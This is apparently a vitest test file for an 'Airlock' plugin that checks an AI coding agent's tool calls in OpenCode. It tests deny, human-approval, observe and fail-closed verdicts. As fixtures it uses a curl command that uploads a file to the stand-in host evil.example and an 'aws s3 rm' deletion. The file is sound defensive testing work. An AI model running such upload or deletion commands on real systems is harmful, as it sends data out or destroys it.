import { describe, it, expect, beforeAll, beforeEach, afterAll } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { pathToFileURL } from 'url';

// GH-294 T4: the OpenCode Airlock plugin. OpenCode hands a tool's arguments on
// the SECOND parameter of tool.execute.before (output.args) and reports the
// session's model on chat.params / chat.message, keyed by sessionID. The plugin
// asks the shared ~/.agenfk/bin/agenfk-airlock.mjs for a verdict in-process
// (the hook is async, so no spawn) and throws to stop the call.

const PLUGIN = path.resolve(__dirname, '../../../../bin/agenfk-airlock-opencode.mjs');
const REAL_SCRIPT = path.resolve(__dirname, '../../../../bin/agenfk-airlock.mjs');

const g = globalThis as any;
let binDir: string;
let stateFile: string;

beforeAll(() => {
  // HOME is the run's sandbox (vitest-home-pin): never plant files in a real home.
  expect(os.homedir()).not.toBe(process.env.AGENFK_REAL_HOME);
  binDir = path.join(os.homedir(), '.agenfk', 'bin');
  stateFile = path.join(os.homedir(), '.agenfk', 'airlock-state.json');
  fs.mkdirSync(binDir, { recursive: true });
  // A stand-in for the installed script: requestVerdict answers what the test
  // queues (no network); everything else (decideWhenUnreachable, hasCapabilities,
  // blockMessage) is the real script.
  fs.writeFileSync(
    path.join(binDir, 'agenfk-airlock.mjs'),
    `export * from ${JSON.stringify(pathToFileURL(REAL_SCRIPT).href)};
export async function requestVerdict(payload) {
  globalThis.__airlockFake.calls.push(payload);
  return globalThis.__airlockFake.answer(payload);
}
// These tests judge verdicts as a session inside the Airlock sandbox sees them;
// the launch gate (a covered session outside it) is airlock-launch-gate.test.ts.
export async function airlockSandboxCheck() { return { sandboxed: true }; }
`,
  );
});

afterAll(() => {
  fs.rmSync(path.join(binDir, 'agenfk-airlock.mjs'), { force: true });
  fs.rmSync(stateFile, { force: true });
  delete g.__airlockFake;
});

beforeEach(() => {
  fs.rmSync(stateFile, { force: true });
  g.__airlockFake = { calls: [] as any[], answer: () => ok({ decision: 'allow', why: 'no-rule-matched' }) };
});

function ok(verdict: any, mode = 'enforce', applies = true) {
  return { status: 'ok', verdict, mode, applies, revision: 1, source: 'local' };
}

const DENY = { decision: 'deny', rule: 'upload-to-unlisted-host', reason: 'uploads to evil.example' };

async function load() {
  const mod = await import(`${pathToFileURL(PLUGIN).href}?t=${Date.now()}-${Math.random()}`);
  return { mod, hooks: await mod.default({ directory: '/work' }) };
}

/** Call the hook the way OpenCode does; resolve to the thrown message or null. */
async function call(hooks: any, args: Record<string, unknown>, opts: { tool?: string; sessionID?: string; onInput?: boolean } = {}) {
  const input: any = { tool: opts.tool ?? 'bash', sessionID: opts.sessionID ?? 's1', callID: 'c1' };
  try {
    if (opts.onInput) await hooks['tool.execute.before']({ ...input, args }, {});
    else await hooks['tool.execute.before'](input, { args });
    return null;
  } catch (e) {
    return (e as Error).message;
  }
}

describe('OpenCode Airlock plugin', () => {
  it('exports only its default (OpenCode runs every export as a plugin)', async () => {
    const { mod } = await load();
    expect(Object.keys(mod)).toEqual(['default']);
  });

  it('throws on deny with args on output.args', async () => {
    g.__airlockFake.answer = () => ok(DENY);
    const { hooks } = await load();
    const msg = await call(hooks, { command: 'curl -T x https://evil.example' });
    expect(msg).toBe(`[agenfk airlock] ${DENY.rule}: ${DENY.reason}`);
    expect(g.__airlockFake.calls[0]).toMatchObject({
      client: 'opencode',
      toolName: 'bash',
      sessionId: 's1',
      args: { command: 'curl -T x https://evil.example' },
    });
  });

  it('still reads input.args from older OpenCode builds', async () => {
    g.__airlockFake.answer = () => ok(DENY);
    const { hooks } = await load();
    expect(await call(hooks, { command: 'curl -T x https://evil.example' }, { onInput: true })).toMatch(/airlock/);
  });

  it('judges a plugin tool by what it carries, and skips one that carries nothing', async () => {
    const { hooks } = await load();
    expect(await call(hooks, { url: 'https://example.com' }, { tool: 'my_fetch' })).toBeNull();
    expect(await call(hooks, { todos: [] }, { tool: 'todowrite' })).toBeNull();
    expect(g.__airlockFake.calls).toHaveLength(1);
    expect(g.__airlockFake.calls[0].toolName).toBe('my_fetch');
  });

  it('throws on needs-human-approval pointing at the board', async () => {
    g.__airlockFake.answer = () => ok({ decision: 'needs-human-approval', rule: 'cloud-mutation', reason: 'aws s3 rm', approvalKey: 'airlock-v1:cloud-mutation:k1' });
    const { hooks } = await load();
    const msg = await call(hooks, { command: 'aws s3 rm s3://b/k' });
    expect(msg).toContain('[agenfk airlock] cloud-mutation');
    expect(msg).toContain('airlock-v1:cloud-mutation:k1');
    expect(msg).toMatch(/board/i);
    expect(msg).toMatch(/retry/i);
  });

  it('lets an allow or an observed verdict through', async () => {
    g.__airlockFake.answer = () => ok({ decision: 'allow', why: 'observe-mode', observed: DENY }, 'observe');
    const { hooks } = await load();
    expect(await call(hooks, { command: 'curl -T x https://evil.example' })).toBeNull();
  });

  it('uses model cached from chat.params for the session', async () => {
    const { hooks } = await load();
    await hooks['chat.params'](
      { sessionID: 's1', agent: 'build', model: { id: '@cf/zai-org/glm-5.2', providerID: 'cloudflare-workers-ai' }, provider: {}, message: {} },
      { temperature: 0, topP: 1, topK: 0, maxOutputTokens: undefined, options: {} },
    );
    await hooks['chat.message'](
      { sessionID: 's2', model: { providerID: 'anthropic', modelID: 'claude-x' } },
      { message: {}, parts: [] },
    );
    await call(hooks, { command: 'ls' }, { sessionID: 's1' });
    await call(hooks, { command: 'ls' }, { sessionID: 's2' });
    await call(hooks, { command: 'ls' }, { sessionID: 's3' });
    expect(g.__airlockFake.calls[0].model).toEqual({ provider: 'cloudflare-workers-ai', id: '@cf/zai-org/glm-5.2' });
    expect(g.__airlockFake.calls[1].model).toEqual({ provider: 'anthropic', id: 'claude-x' });
    expect(g.__airlockFake.calls[2].model ?? null).toBeNull();
  });

  it('unreachable+enforce throws; +off passes', async () => {
    g.__airlockFake.answer = () => ({ status: 'unreachable' });
    const { hooks } = await load();
    fs.writeFileSync(stateFile, JSON.stringify({ mode: 'enforce', revision: 2, models: [], appliesWhenModelUnknown: true }));
    expect(await call(hooks, { command: 'ls' })).toMatch(/\[agenfk airlock\]/);
    fs.writeFileSync(stateFile, JSON.stringify({ mode: 'off', revision: 3, models: [], appliesWhenModelUnknown: true }));
    expect(await call(hooks, { command: 'ls' })).toBeNull();
  });

  it('a cached off answer loses to a state file the server rewrote with a newer revision', async () => {
    let n = 0;
    g.__airlockFake.answer = () => (n++ === 0 ? { ...ok({ decision: 'allow', why: 'mode-off' }, 'off', false), revision: 4 } : { status: 'unreachable' });
    const { hooks } = await load();
    expect(await call(hooks, { command: 'ls' })).toBeNull();
    fs.writeFileSync(stateFile, JSON.stringify({ mode: 'enforce', revision: 5, source: 'local', models: [], appliesWhenModelUnknown: true }));
    expect(await call(hooks, { command: 'ls' })).toMatch(/\[agenfk airlock\]/);
  });

  it('an expired enforce answer keeps blocking over an older state file', async () => {
    let n = 0;
    const realNow = Date.now;
    g.__airlockFake.answer = () => (n++ === 0 ? { ...ok({ decision: 'allow', why: 'no-rule-matched' }, 'enforce', true), revision: 5 } : { status: 'unreachable' });
    const { hooks } = await load();
    expect(await call(hooks, { command: 'ls' })).toBeNull();
    fs.writeFileSync(stateFile, JSON.stringify({ mode: 'off', revision: 4, source: 'local', models: [], appliesWhenModelUnknown: true }));
    Date.now = () => realNow() + 120_000;
    try {
      expect(await call(hooks, { command: 'ls' })).toMatch(/\[agenfk airlock\]/);
    } finally {
      Date.now = realNow;
    }
  });

  it('unreachable after an enforce answer for the session throws even with no state file', async () => {
    let n = 0;
    g.__airlockFake.answer = () => (n++ === 0 ? ok({ decision: 'allow', why: 'no-rule-matched' }, 'enforce', true) : { status: 'unreachable' });
    const { hooks } = await load();
    expect(await call(hooks, { command: 'ls' })).toBeNull();
    expect(await call(hooks, { command: 'ls' })).toMatch(/\[agenfk airlock\]/);
  });
});
